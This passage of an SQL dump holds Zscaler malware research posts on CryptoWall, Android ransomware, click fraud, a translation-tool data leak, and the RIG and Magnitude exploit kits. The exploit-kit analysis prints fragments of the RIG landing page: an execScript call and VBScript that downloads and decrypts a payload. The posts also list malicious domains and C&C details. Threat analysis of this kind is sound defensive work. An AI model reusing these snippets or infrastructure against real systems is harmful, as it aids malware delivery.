  	             	  		  			  		  		  			C&C communication - Decrypted response with public key  		  	      Upon successful encryption of the files on the victim machine using the public key, it reports back the number of files that were encrypted to the C&C server. The information collected by the C&C server is leveraged to present a more personalized decryption instruction page that includes user\'s operating system, public IP address, and the number of files encrypted as seen below.       	  		  			  		  		  			Personalized ransom payment page  		  	    The ransom amount requested in our case was $500 USD and to prove authenticity, the malware authors also offer the victim a \"Decrypt 1 file for FREE\" option, which is limited to a 512 kilobyte file.    Below is the geo distribution of the CryptoWall C&C servers we oberved in the past week:       	  		  			  		  		  			CryptoWall C&C servers  		  	           	  		  			  		  		  			CryptoWall C&C country distribution  		  	      Compromised WordPress sites used for C&C communication  We are also seeing an increase in the number of compromised WordPress sites being used for CryptoWall C&C communication. Below are some of the locations where the malicious scripts are being hosted on these servers:      	/wp-content/plugins/revslider/temp/update_extract/  	/wp-content/uploads/wpallimport/uploads/  	/wp-content/themes/pptitan/    You can get full list of the Compromised WordPress sites that we have oberved in past one week here.    Conclusion  CryptoWall remains a potent threat to enterprises and individual users alike. Traditional AntiVirus applications continue to struggle against this nasty strain of ransomware, as once the infection is successful, there is very little AV vendors can do, even by adding signatures reactively. A hybrid and multi-layered security approach is required to counter this threat.    Taking regular backup remains the most effective counter measure against ransomware.    Deepen Desai & Avinash Kumar', 'Abuse;Compromise;Encryption;Ransomware', 'https://www.zscaler.com/blogs/research/signed-cryptowall-30-variant-delivered-mediafire');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (140, 'More Porn Clicker Malware Masquerading As Dubsmash On Google Play Store', 'Viral Gandhi', 'June 01, 2015', 'Introduction\r\n\r\nDubsmash is a mobile app to create short \"selfie\" videos dubbed with famous sounds. It is extremely popular and is currently ranked #10 under Top free Android apps. The users of this app include many well known celebrities who eventually post the dubbed videos on popular social networking platforms like Facebook and Twitter.\r\n\r\nThe popularity of this app has caught the attention of the malware authors too, which is evident with a string of Trojan Porn Clicker apps disguised as Dubsmash posted on the Google Play Store in the past month (covered in ESET and AVAST blogs). The malicious apps mentioned in those blogs were quickly taken down by Google. However, we continue to see newer variants of the same malware family being uploaded to the Google Play store with the latest one posing as Dubsmash V3.\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Google Play - Trojan Porn Clicker app\r\n		\r\n	\r\n\r\nAlthough the malicious app poses as Dubsmash, the icon that the user sees upon installation imitates Settings, Memory Game, or a Flappy Bird app. The newest iteration of this malicious app has already been downloaded nearly 5,000 times.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fake App Icon\r\n		\r\n	\r\n\r\nThe malware automatically removes the icon once the user quits the application for the first time, however it continues to run in the background as seen below.\r\n\r\n \r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Porn Clicker Process\r\n		\r\n	\r\n\r\n\r\nPorn Clicker analysis\r\nThe purpose of this malware is to generate revenue for the malware author by generating clicks on the adult porn websites. While this may be good news that the user\'s credentials or sensitive information are not being stolen, it can still lead to financial loss for the end users through increased mobile data usage.\r\n\r\nThe Porn Clicker variants described in the previous blogs involved hardcoded, encrypted porn URLs in the malicious APK, whereas we are now seeing the newer variant dynamically retrieving the porn URLs from a remote server.\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Clicking activity\r\n		\r\n	\r\n\r\nThe malicious app in our case contained two hardcoded URLs shown in the screenshot below:\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Porn Clicker remote servers\r\n		\r\n	\r\n\r\nPreconfigured URLs:\r\n\r\n\r\n\r\n	memr[.]oxti.org/g/getasite/  - The malicious app will get a new porn URL to visit from this location.\r\n	memr[.]oxti.org/z/z2/ - This location currently serves JavaScript code that will result in a random click on the porn site that gets visited by the app.\r\n\r\n\r\nScreenshots below show the porn URLs that are dynamically retrieved  by the malicious app from the first location.\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Porn URL1\r\n		\r\n	\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Porn URL2\r\n		\r\n	\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Porn URL3\r\n		\r\n	\r\n\r\n\r\nJavaScript leveraged by the malicious app from a remote location to perform click fraud is shown in the screenshot below.\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			JavaScript - Random Click\r\n		\r\n	\r\n\r\nIt appears that the malware author keeps uploading and removing the same app on the Google Play store under different accounts. During the course of this write up, we saw the following two variations:\r\n \r\n\r\n	Dubsmash V3 [Package name: com.memr.gamess] - has been removed\r\n	Dubsmash 2    [Package name: com.jet.dubsh] - still active\r\n\r\n \r\n\r\nConclusion\r\nThe first variant of the Porn Clicker app masquerading as Dubsmash was reported in April, 2015 and it is concerning to see newer variants of the same malware slipping through Google\'s app vetting process even today.  The malware authors are still targeting Dubsmash as a disguise to trick end users into downloading the malicious app.\r\n\r\nIt is highly recommended for users to check the reviews & ratings of the apps, even when downloading them from official Google Play store. If you are infected with such an app, you can delete it by going to Settings >Apps > (AppName).\r\n\r\nWrite-up by: Viral Gandhi & Deepen Desai', 'Click Fraud;Mobile;Mobile Malware', 'https://www.zscaler.com/blogs/research/more-porn-clicker-malware-masquerading-dubsmash-google-play-store');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (141, 'Android Ransomware - Porn Droid', 'Viral Gandhi', 'May 28, 2015', 'Recently, we came across a new variant of Porn Droid - an Android ransomware variant claiming to be from the FBI, which accuses people of watching child porn and then demands a fine of USD 500.         File information:           	Dropped URL : hxxp://sbqujqosyw[.]offer-mobi.com/mmesuofyqq1/pornvideo[.]apk  	MD5 : 857b887982f11493b4a1db953161e627  	Virustotal Detection : 5/56    It initially appears to the user as if they are downloading a pornographic video, but once the user clicks on the file, it masquerades as the Google patch update and tricks the user into installing the application.         	  		  			  		  		  			Disguise as patch application  		  	        After clicking \"Continue\", the malware asks for administrator access to the device requesting permissions such as \"Erase all data\", \"Set storage encryption\", \"Change the screen-unlock password\" as shown in screenshot below.         	  		  			  		  		  			Admin access  		  	        Once the user clicks on the \"ACTIVATE\" button, the malware gets administrator control of the device and locks it while displaying a fake FBI warning as seen below. It locks the user\'s phone by disabling keyguard and sets top priority for the malware application which ensures that no other application or user activity can override the malware application\'s activity.         	  		  			  		  		  			FBI warning message  		  	        	  		  			  		  		  			FBI warning - Payment tab  		  	        	  		  			  		  		  			FBI warning screen with user information  		  	      The FBI warning screen also contains dynamic information relevant to the infected device such as the browser history, IMEI number, phone number and victim\'s picture, which has been taken by the malicious app. This is done to intimidate the end user as a warning message suggests that the information will be used by the FBI to identify the user if the fine is not paid.  Porn Droid Static Analysis  The screenshot below shows the malicious app accessing the browser history and bookmarks to display on the ransom screen.          	  		  			  		  		  			Browser history  		  	      It then appends the hard coded fake FBI warning message asking for ransom.         	  		  			  		  		  			Ransom screen text code  		  	      The code below shows the malware author\'s attempt to evade string pattern matching based antivirus (AV) heuristic detection by leveraging a string concatenate function. This is one of the reasons why this sample has a very low (5/56) AV detection rate at the time of our analysis.         	  		  			  		  		  			\"concate\" usage to evade AV detection  		  	      Another unique functionality that we observed in this mobile ransomware, that we more commonly see in PC malware, involves checking for the presence of installed AV applications such as ESET, Avast and DrWeb. It then attempts to terminate any AV applications identified.         	  		  			  		  		  			AV Application check & terminate  		  	      In order to stay active on the screen and lock out the phone, it disables the keyguard so the user cannot exit the application.              	  		  			  		  		  			Disable keyguard  		  	         We also observed the following commands that the malicious app may receive from a remote server:      	destroy - wipe all user data  	unlock - deactivate the Admin access and unlock the device        	  		  			  		  		  			Commands  		  	      The app is also capable of taking pictures using the front facing camera  that it can then display on the ransom screen:         	  		  			  		  		  			Front facing camera picture  		  	      The malware\'s Command & Control (C&C) server information is hardcoded in the configuration class as seen below.         	  		  			  		  		  			Bot configuration  		  	      C&C message parameters           	Server :  \"http://facebook-tw.zp.ua\"  	URI:  \"/pafumokat/bloqyxpn.php\"  	paramString1 : random number in the range of 1 to 3   	paramString2 :  String made of BotID, network, location, phone number, bot version, SDK.  	paramString3 : \"Protection\"  	paramStrong4 : \"Bot\"    Below is a sample C&C POST request that we captured during our analysis:      	  		  			  			   			  		  		  			C&C request  		  	      The best way to avoid such malware is to stick with installing Android apps only from \'official\' app stores such as Google Play or the Amazon Appstore.', 'Mobile;Mobile Malware;Ransomware;Social Engineering', 'https://www.zscaler.com/blogs/research/android-ransomware-porn-droid');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (142, 'Machine Translators May Leak Confidential Information', 'Loren Weith', 'May 26, 2015', 'One challenge for enterprises dealing with confidential information in conjunction with cloud-based systems is that they must exercise due diligence to ensure that it remains confidential. The steps are beyond the scope of a technical blog, but generally it involves making sure that everyone processing the confidential information understands that it is sensitive and has agreed to protect it.\r\n\r\nFor cloud services like Enterprise Resource Planning (ERP), Human Resources, Video Conferencing and so on, the confidentiality issues are very well understood, but there are exceptions like machine translation. When we think of data leaks, we rightly look primarily to malicious software (worms, viruses, customized zero-days from Advanced Persistent Threats (APT\'s), etc.) when seeking to prevent confidential data from leaving a network.\r\n \r\n\r\n\r\n\r\nMachine translation tools are an interesting member of the “other” category of legitimate tools that can result in confidential data leaks without malicious intent from user or developer. Machine translation tools range from simple web sites like “youdao” pictured above or Google Translate, where it is pretty clear that information is leaving, up to integrated desktop applications, where the movement of data is not nearly as obvious.\r\n \r\n\r\n\r\n\r\nThe Youdao Dictionary application is installed like any other and operates like any other, except that the translation engine is remote and the application sends it’s lookups in plain text via insecure HTTP GET\'s. The fact that the translation tool is an application running on a user’s PC, makes it less likely that the person making use of it would realize that they are leaking information because the appearance is that their computer is doing the translation, not a web site.\r\n\r\nIn the above dissection of a URL retrieved by the tool, we see the word “information” being queried in the “q” field, but it could just as well be that someone isn\'t entirely sure what “Лечение герпеса Боба Джонса не будет хорошо” means, and would highlight it and click translate. That act results in the application enerating something similar to the plaintext query above, except with that chunk of Russian. The user will then learn that the string translates to “Bob Jones\' herpes treatment is not going well.” Unfortunately, the request and the translation are transferred in plaintext form, which can be learned by passive interception.\r\n\r\nThe application that we use as an example is from Youdao (有道), a major Chinese Internet company that, according to Wikipedia (http://en.wikipedia.org/wiki/Youdao), ships an offline and free online version of their translation tool. Through some limited experimentation, Youdao\'s site does seem to support the same functionality over the more secure, encrypted HTTPS protocol. We have observed insecure communication in the wild for versions ranging from 2.2.16 to 5.4.43, but it would be unfair to discuss the tool without looking at the latest version. The latest version of the Youdao tool we could find, version 6.3.66.1117, was downloaded from http://codown.youdao.com/cidian/static/6.3/20141203/YoudaoDict.exe and tested on a Windows 7 machine and there was no significant difference in behavior.\r\n\r\nOur test version also makes use of plaintext (HTTP) communication by default and appears to automatically translate whatever word is near the mouse pointer, whenever it stops moving, between Chinese and English. It also has an option where a small button appears that you can click (or hover over) to translate a highlighted piece of text. Having used the program, it is easy to imagine why this tool is popular with users who need to translate between Chinese and English. In addition to the translation features, it also keeps users from being bored by providing extra advertisements.\r\n\r\nWhat the tool provides in features, it definitely does not provide in security – while it works as intended and does not appear to be up to anything overtly nefarious, it still sends all the translation requests via the insecure HTTP protocol to a back-end server where the translation takes place.\r\nConclusion\r\nThe conclusion for customers is simple: translation software might send data to networks / systems outside your realm of control – if it does, then exactly as would be the case for a cloud-based ERP or Human Resources system, it is important to know where it goes, how it gets there, and that the third parties processing the information do so in a manner that is compatible with your organization\'s policies and contractual obligations. Given that the messages to be translated are sent in clear text, anyone on the same network could easily intercept the communication by sniffing network traffic. Translated content could range from benign phrases to highly sensitive information.\r\n\r\nQuestions to which we do not yet have answers, like whether the translation can be “paused,” if HTTPS can be enabled through configuration, if Youdao\'s privacy policy prevents disclosure, if any HTTPS functionality is implemented securely, etc. should be answered before deploying YoudaoDict or similar cloud-based translation tools in a confidential setting. Naturally, we would recommend to Youdao that they at least make use of HTTPS by default in future releases of their software, due to the risk of inadvertently disclosing their users\' confidential information.\r\nDetails\r\nThe following experiment was performed to verify whether traffic is still passed in plaintext HTTP GET requests, as it was in previous versions. The setup is a fake letter being written in notepad by an associate at the law firm of Nerd, Geek, and Spaz, LLP, who are defending a client who is being sued for some reason…\r\n \r\n\r\n\r\n\r\nWhen the two lines were highlighted, a little blue book popped up and hovering over the book results in a translation being executed. That translation is actually performed on a remote server and the following URL is visited by the software:\r\n \r\n\r\nhttp://dict.youdao.com/fsearch?keyfrom=deskdict.screentrans.http.0.stroke&q=Bill%20Jones%20is%20getting%20sued%20for%20some%20really%20embarassing%0D%0Aporn%20that%20was%20found%20on%20his%20work%20computer.%20%20Please%20advise&pos=-1&doctype=xml&xmlVersion=3.2&dogVersion=1.0&client=deskdict&id=8bba3b7bdf465c61b&vendor=unknown&in=YoudaoDict&appVer=6.3.66.1117&appZengqiang=0&abTest=&le=eng&fytype=AUTO&scrfrom=stroke&proc=notepad.exe\r\n\r\n\r\nFor convenience, we look at the same URL after decoding it and converting to pretty-printed JSON:\r\n \r\n\r\n{\r\n    \"username\": null, \r\n    \"netloc\": \"dict.youdao.com\", \r\n    \"vars\": {\r\n        \"appZengqiang\": \"0\", \r\n        \"vendor\": \"unknown\", \r\n        \"fytype\": \"AUTO\", \r\n        \"keyfrom\": \"deskdict.screentrans.http.0.stroke\", \r\n        \"dogVersion\": \"1.0\", \r\n        \"pos\": \"-1\", \r\n        \"doctype\": \"xml\", \r\n        \"q\": \"Bill%20Jones%20is%20getting%20sued%20for%20some%20really%20embarassing%0D%0Aporn%20that%20was%20found%20on%20his%20work%20computer.%20%20Please%20advise\", \r\n        \"le\": \"eng\", \r\n        \"appVer\": \"6.3.66.1117\", \r\n        \"client\": \"deskdict\", \r\n        \"in\": \"YoudaoDict\", \r\n        \"xmlVersion\": \"3.2\", \r\n        \"proc\": \"notepad.exe\", \r\n        \"id\": \"8bba3b7bdf465c61b\", \r\n        \"scrfrom\": \"stroke\"\r\n    }, \r\n    \"fragment\": \"\", \r\n    \"scheme\": \"http\", \r\n    \"hostname\": \"dict.youdao.com\", \r\n    \"params\": \"\", \r\n    \"query\": \"keyfrom=deskdict.screentrans.http.0.stroke&q=Bill%20Jones%20is%20getting%20sued%20for%20some%20really%20embarassing%0D%0Aporn%20that%20was%20found%20on%20his%20work%20computer.%20%20Please%20advise&pos=-1&doctype=xml&xmlVersion=3.2&dogVersion=1.0&client=deskdict&id=8bba3b7bdf465c61b&vendor=unknown&in=YoudaoDict&appVer=6.3.66.1117&appZengqiang=0&abTest=&le=eng&fytype=AUTO&scrfrom=stroke&proc=notepad.exe\", \r\n    \"path\": \"/fsearch\", \r\n    \"password\": null, \r\n    \"port\": null\r\n}\r\n\r\n\r\nWe can see the variables broken apart more easily in the JSON version and the sentence in our screen-shot it clearly visible with “%20” replacing the spaces and “%0A%0D” replacing the end of line. When decoded, the following is the result:\r\n \r\n\r\nBill Jones is getting sued for some really embarassing\r\nporn that was found on his work computer.  Please advise\r\n\r\n\r\nThis is the exact content of the highlighted region of the Notepad application. Clearly, the fact that the firm cannot spell “embarassing” correctly could put some egg on their face, making this a potentially very damaging leak. The tool also passes information about the application where the translated text came from, which is indeed “notepad.exe,” version numbers, affiliate identifiers (for companies distributing the program to presumably share in ad revenues,) and other miscellaneous information.', 'Cloud;Data Breach;Vulnerability', 'https://www.zscaler.com/blogs/research/machine-translators-may-leak-confidential-information');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (143, 'RIG Exploit Kit Infection Cycle Analysis', 'ThreatLabz', 'May 20, 2015', 'Overview  Happy belated birthday to RIG exploit kit! First seen around April 2014, RIG has been in the news several times over the past year. In February, the source code was reportedly leaked online, which likely spurred some of the recent changes we\'ve observed in the kit. ThreatLabZ has been keeping an eye on RIG and in this post we\'ll cover an example of a full RIG infection cycle.    Delivery  In the past, RIG used malvertising and compromised sites to send users to RIG landing pages and we\'ve seen no change in this tactic. Compromised sites leading to RIG usually contain an iframe in the page header that loads a RIG proxy domain, which also contains an iframe leading to the RIG landing page. The full infection cycle is shown in the annotated Fiddler session below.       	  		  			  		  		  			Fig 1: RIG Infection Cycle  		  	        In this example, the compromised site actually contains three different malicious iframes in its header. These iframes correspond to line items 37-39 in Fig 1.       	  		  			  		  		  			Fig 2: iframes on Compromised Site  		  	        Out of the three RIG proxy iframes on the compromised site, only one, sunfuji[.]com, is still redirecting victims to RIG landing pages. Much like the iframe on the compromised site, the RIG proxy page contains an iframe redirecting victims to the actual landing page.       	  		  			  		  		  			Fig 3: RIG Proxy Redirects to RIG Landing  		  	        Note that the RIG proxy is a persistent redirector, which will change the landing page location arbitrarily. Taken at a different time, the same page returned the following result:       	  		  			  		  		  			Fig 4: RIG Proxy Changed Landing Page  		  	      Landing Page  The landing page has multiple consistent attributes, starting with the URI. Every RIG landing page URI starts with a question mark, followed by 171 characters. Two examples are below:      	four.pavementexpress[.]org/?xH6Af7ieJRvHDIs=l3SKfPrfJxzFGMSUb-nJDa9GPkXCRQLPh4SGhKrXCJ-ofSih17OIFxzsmTu2KV_OpqxveN0SZFT_zR3AaQ4ilotXQB5MrPzwnEqWwxWeioWBrxaIYwMU95LEQOdviwijm7VFJMonk0DRvWcDnrtMU0gbrA  	trip.slotsbid[.]com/?xniKfredKx_HCYY=l3SKfPrfJxzFGMSUb-nJDa9GPkXCRQLPh4SGhKrXCJ-ofSih17OIFxzsmTu2KV_OpqxveN0SZFT_zR3AaQ4ilotXQB5MrPzwnEqWwxWeioWAqBHbYw1MrcOTEOcz0Aj2yeVBd892zxWA4GMBmL5MVUgbrA    The landing page itself contains three blocks of obfuscated code along with some portions of text from a popular CNET article. The majority of the code is actually a long list of character-delimited strings that are passed to a function that basically splits them on the delimiter and runs \'fromCharCode\':       	  		  			  		  		  			Fig 5: Top of the RIG Landing Page - strings use \'t\' delimiter  		  	        The decode function for each of the three code blocks immediately follows the set of character-delimited strings, as shown in Fig 6.       	  		  			  		  		  			Fig 6: Decode function for first set of character-delimited strings  		  	        The deobfuscated first block of code attempts to detect known virtual machine characteristics and other attributes that might indicate an analysis environment. If anything is found, the next two code blocks are not deobfuscated or executed.       	  		  			  		  		  			Fig 7: Code block 1 deobfuscated - detect analysis environment  		  	        The second code block is a large base64-encoded VBScript segment:       	  		  			  		  		  			Fig 8: Code block 2 deobfuscated - vbscript  		  	        The VBScript is executed from the following code:        function time() {window.execScript(base64_decode(scriptvar), \"VBscript\");}setTimeout(time, 3001);        Once executed, the VBScript exploits CVE-2014-6332, the so-called \'Godmode\' exploit (VT detection - 4/57). AV detection tends to be particularly bad on the VBScript even though the code very closely matches the proof of concept originally publicized. There is a good writeup from TrendMicro, which delves into the details of this vulnerability. If exploitation is successful, the encrypted exe is downloaded, decrypted, and executed on the system. The encryption key for the binary is conveniently in cleartext within the VBScript:             If objHTTP.Status = 200 Then               Set objFile = objFSO.CreateTextFile(strSaveTo,True)               objFile.Write EnDeCrypt(ByteArray2String(objHTTP.responseBody), \"nkiOaWsg\")               objFile.Close               End If        The third block of code simply serves up a malicious SWF with no secondary obfuscation:       	  		  			  		  		  			Fig 9: Code block 3 deobfuscated - malicious SWF  		  	        This code is almost the same as in other exploit kits, and the URL of the encrypted binary is being passed to the SWF as a parameter. The exploit in this case was CVE-2015-0313, which affects Flash versions prior to 16.0.0.305, and the exploit code is contained in a script called \'wow.\' Detection on VirusTotal shows 10/57, and there are several public writeups on this vulnerability.    Payload #1 - Injector  The binary payload is encrypted with an 8-byte key, which you can guess from the stream or retrieve from the deobfuscated VBScript.       	  		  			  		  		  			Fig 10: Encrypted Binary - key is \'WsgnkiOa\'  		  	        VirusTotal detection is a bit better than 50% for this payload at 32/57. The binary file is a Nullsoft Installer self-extracting archive and extracting the archive reveals three files inside:       	  		  			  		  		  			Fig 11: Extracted Files from EXE  		  	        In addition to these three files, another executable \'b8.exe\' is dropped. Once the installer finishes dropping files, it loads the DLL (15/55 on VirusTotal) and begins executing functions to read in the other two files. The file \'6ag1rqashtwqw1hgqa\' contains data XOR\'d with the first 10 bytes of the filename, and the decrypted contents reveals several API calls that give us an idea of what will happen next, for example CreateProcessA, WriteProcessMemory, and ResumeThread.       	  		  			  		  		  			Fig 12: Decrypting file data with filename  		  	        Similarly, the \'Stevie Nicks\' .m3u is unfortunately not actually a playlist, but instead an encrypted binary that is decrypted by the DLL using the XOR key \"ZhmGqqKwXmJiiS7dzjzPyyaTw0PANF\".       	  		  			  		  		  			Fig 13: Decrypting \'Stevie Nicks\' playlist binary  		  	        VirusTotal detection on the decrypted Stevie Nicks binary is 35/56.  Ultimately, this leads to creating a hollow process of itself (process hollowing - PDF) which then creates an explorer.exe process and injects code to beacon to the Command & Control (C&C) server. Beacons were frequent and used the URI string \'/power/logout.php\' to POST to the domain \'starpowerss.com\'       	  		  			  		  		  			Fig 14: C&C Traffic Sample  		  	        Other notable activity includes:    	Copying to \'C:\\Program Files\\Common Files\\Windows Search 5.3.10\\<random>.exe\'  	Using the registry for persistence  	Hooking ZwOpenFile and ZwOpenProcess  	Clipboard control      Payload #2 - Blue Bot  After quite some time, a second payload is downloaded named \'cfajrs.exe\' from \'a.pomf.se\' which beacons to 141.138.157.240. Four URIs were observed:      	/help/proxy  	  		Returns a list of 4032 IP:PORT pairs (paste of IP:PORT data)  	  	  	/help/blog  	  		Returns a list of 798 URLs that appear to be blogs (paste of blog data)  	  	  	/help/botlogger.php  	  		Returns div of HTML with \"visitors online\" (see Fig 15)  	  	  	/help/target  	  		Returns \'STOP|STOP|STOP\' during analysis (see Fig 16)  	  	           	  		  			  		  		  			Fig 15: /help/botlogger.php response  		  	           	  		  			  		  		  			Fig 16: /help/target response  		  	        VirusTotal detection is 41/56 and indicates this is part of BlueBotnet. Looking at the binary, we see it\'s a .NET executable and uses no obfuscation at all to make decompilation difficult. Looking at the namespace and classes confirms this is called \'Blue_Botnet\' and appears to be a DoS tool.       	  		  			  		  		  			Fig 17: Blue_Botnet Code Overview  		  	      One of the more interesting functions is the \'updateTarget\' function, which expects a pipe-delimited list of IP, port, and method. There are multiple different methods accepted for the \'target\' command: UDP, TCP, SYN, MCBOTALPHA, HTTP, HTTPROXY, PRESS, and STOP.       	  		  			  		  		  			Fig 18: Blue_Botnet updateTarget Function  		  	        To perform its attacks, the bot has a list of 37 different user agent strings to make detection more difficult (paste of user agents); each request uses a different user agent from the list so requests look like they are coming from multiple different clients instead of from the same source. There is an Italian-language theme to the code, both in some of the variable names and in some of the HTTP headers, for example the Accept-Language header in the HTTP attack function shown below.       	  		  			  		  		  			Fig 19: Blue_Botnet HTTP Attack Function  		  	        Interestingly, the response from botlogger.php is not used in the code and the request may simply be a beacon to the server to keep count of infections.  Conclusions  RIG continues to be a popular and effective exploit kit choice and has evolved over the past year, indicating active development. While other exploit kits are moving toward ransomware and adfraud for monetization of infected victims, RIG is apparently not following this trend and still pushes more traditional malware. ThreatLabZ will continue to monitor RIG for any new developments. For a look at the infrastructure supporting RIG, Trustwave has a great post on the topic.', 'Exploit Kit;Malware;Vulnerability', 'https://www.zscaler.com/blogs/research/rig-exploit-kit-infection-cycle-analysis');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (144, 'Magnitude Exploit Kit Leading To Ransomware Via Malvertising', 'Chris Mannon', 'May 18, 2015', 'Magnitude Exploit Kit is a malicious exploit package that leverages a victim’s vulnerable browser plugins in order to download a malicious payload to a system.  This technique is known as a drive-by-download attack, which is often leveraged on compromised websites and malicious advertising networks.    We recently found a number of compromised pages following the structure of fake search engine pages. The following sites have been seen to redirect to malicious content:    	hymedoraw[dot]com/search[dot]php  	awerdeall[dot]com/search[dot]php  	index-html[dot]com/  	joomla-green[dot]com/  	bestcool-search[dot]com/  	joyo-search[dot]com/  	megas-search[dot]com/  	speeds-search[dot]com/  	sample-data[dot]com/  	lazy-summer[dot]com/  	tundra-search[dot]com/  	death-tostock[dot]com/  	adoncorst[dot]com/search[dot]php  	demo-content[dot]com/  	enable-bootstrap[dot]com/  	rospecoey[dot]com/search[dot]php  	aranfleds[dot]com  	adoncorst[dot]com/search[dot]php  	malpithia[dot]com/search[dot]php  	noutademn[dot]com/search[dot]php    We\'ve also seen a high volume of Malvertising activity leading to Magnitude Exploit Kit hosting sites. The biggest offender of this Malveritising activity is from \"click2.systemaffiliate.com\" operated by the ad network Sunlight Media, as seen in the list below:      	click2[dot]systemaffiliate[dot]com/filter/?keyword=Area+Rugs+Cleaning+hotels+for+sale+by+owner  	  		b7b6o[dot]y2ff[dot]3b1f767u[dot]dc[dot]3d478d[dot]t97a2as[dot]pdf0q[dot]zf1[dot]eaq6907579[dot]hatentries[dot]in/?17657271747b7e747c2539646e6463727a7671717e7b7e7663723974787a  	  	  	click2[dot]systemaffiliate[dot]com/filter/?keyword=backhoes+for+sale+Granite+Counter+Tops  	  		nd4e61i[dot]0fedz[dot]i9390[dot]11f[dot]b8e0[dot]c1i[dot]51aa8a5x[dot]b22n[dot]z1037n6z[dot]rulesreturning[dot]in/?3f4d5a595c53565c540d114c464c4b5a525e59595653565e4b5a115c5052  	  	  	click2[dot]systemaffiliate[dot]com/filter/?keyword=direct+tv+dallas+tx+financial+services+companies  	  		kfb39c[dot]ec526[dot]k149t[dot]13f44d[dot]gfb9820[dot]q5c[dot]c778eg[dot]c47b0v3diz2[dot]backedmisuse[dot]in/?1567707376797c767e273b666c666170787473737c797c7461703b767a78  	  	  	click2[dot]systemaffiliate[dot]com/filter/?keyword=business+processes+management+Metaire+Construction+Management+Service  	  		a19602cr[dot]773a9be[dot]bd407edi[dot]m602f890[dot]wfd6b[dot]eay836h7h[dot]bytessounds[dot]in/?3a485f5c595653595108144943494e5f575b5c5c5356535b4e5f14595557  	  	  	click2[dot]systemaffiliate[dot]com/filter/?keyword=michelin+tire+Shingle+Roofer  	  		0eeda91z[dot]w8cb575d[dot]b8[dot]s247[dot]maf35794i[dot]q9b[dot]yc79p[dot]b[dot]y7siiy61xy[dot]bytessounds[dot]in/?295b4c4f4a45404a421b075a505a5d4c44484f4f404540485d4c074a4644  	  	  	click2[dot]systemaffiliate[dot]com/filter/?keyword=compact+suv+internet+hosting+company  	  		u0b49r[dot]b9l[dot]r76783b2i[dot]ce01s[dot]k25o[dot]8f3t[dot]w32[dot]1d1dl[dot]u63g[dot]s45t[dot]xk6z4x0ok4[dot]isessentially[dot]in/?3f4d5a595c53565c540d114c464c4b5a525e59595653565e4b5a115c5052  	  	  	click2[dot]systemaffiliate[dot]com/filter/?keyword=hotel+prices+Air+Duct+Cleaning+Service  	  		za46[dot]1375623[dot]e53cb4[dot]2014[dot]50ebd[dot]t1c06f[dot]61[dot]y7f8vkub0[dot]safelyinstall[dot]in/?16647370757a7f757d2438656f6562737b7770707f7a7f7762733875797b  	  	  	click2[dot]systemaffiliate[dot]com/filter/?keyword=supercuts+coupons+sales+presentation+equipment  	  		01e717[dot]i06917c[dot]36f5[dot]j056[dot]m66a[dot]176f3f[dot]5ej[dot]p6e[dot]h2xb793w17[dot]safelyinstall[dot]in/?285a4d4e4b44414b431a065b515b5c4d45494e4e414441495c4d064b4745  	  	  	click2.systemaffiliate[dot]com/filter/?keyword=free+latest+accounting+software+Laptops  	  		of62b8a[dot]x43f292x[dot]a674q[dot]r5ec03a[dot]y01c9b[dot]f7367u[dot]cgh63008[dot]husbandhides[dot]in/?3f4d5a595c53565c540d114c464c4b5a525e59595653565e4b5a115c5052  	  	  	click2[dot]systemaffiliate[dot]com/filter/?keyword=marine+equipment+and+supply+company+real+esate+hotline  	  		 g1812c47[dot]t6060f09l[dot]t74711a[dot]m69131[dot]l88[dot]z874f0h[dot]b88z8j4s31ji[dot]husbandhides[dot]in/?2b594e4d484742484019055852585f4e464a4d4d4247424a5f4e05484446  	  	    The Malvertising networks lead to redirector domains utilizing 302 cushioning. Our recent data shows the following redirector domains to have been heavily utilized:       	  	paypal-invest[.]net  	  	  	paypal-invest[.]info  	  	paypal-invest[.]biz      Following the 302 redirect, Magnitude delivers both a malicious Flash payload as well as a highly obfuscated JavaScript payload (MS13-009 Microsoft Internet Explorer COALineDashStyleArray Integer Overflow exploit). Once the browser has been exploited, Magnitude proceeds to a new step in the infection cycle where the malware payload would normally be downloaded immediately following exploitation, we are now seeing a shellcode payload being served.         	  		  			  		  		  			Shellcode being served  		  	           The shellcode is a simple payload that utilizes the Windows library ‘urlmon.dll’ to attempt to fetch a list of URLs contained within the shellcode. In the cases we have seen so far, only the first URL results in a payload (CryptoWall 3.0), while the others return no data.         	  		  			  		  		  			CryptoWall payload download  		  	        This is a highly profitable ransomware payload that leverages Bitcoin transactions executed over the Tor Anonymizer to monetize the attack. Threat Actors utilize this method of collection because it can\'t be reliably traced back to the them. Victims are especially vulnerable to this type of extortion since very few people seem to backup their critical files such as documents and pictures.         	  		  			  		  		  			CryptoWall decryption instruction  		  	        ThreatLabZ has been actively monitoring this Magnitude EK activity and the image below illustrates the transactions we saw for this campaign:         	  		  			  		  		  			The Green represents Payload activity; The Blue represents Landing Page activity.  		  	      As with most threat actors, once they find a location that allows them to host their attacks they tend to stick with it. The lion\'s share of target IPs seen from our research show that Germany is the biggest hosting location for this activity.         	  		  			  		  		  			Other countries seen to host this activity: NL (3%) US(2%) JP(2%)  		  	      Conclusion  Exploit Kits are evolving to bypass standard security solutions that utilize basic URL filtering techniques. Attackers are utilizing various methods of infection, including malvertising and iFrame injection on compromised pages. Ransomware is a highly profitable, recording up to $33,000 per day at one point. The sophistication of these attacks are on the rise and security leaders need to keep apprised of this maturing illegal market.    Analysis done by Edward Miles & Chris 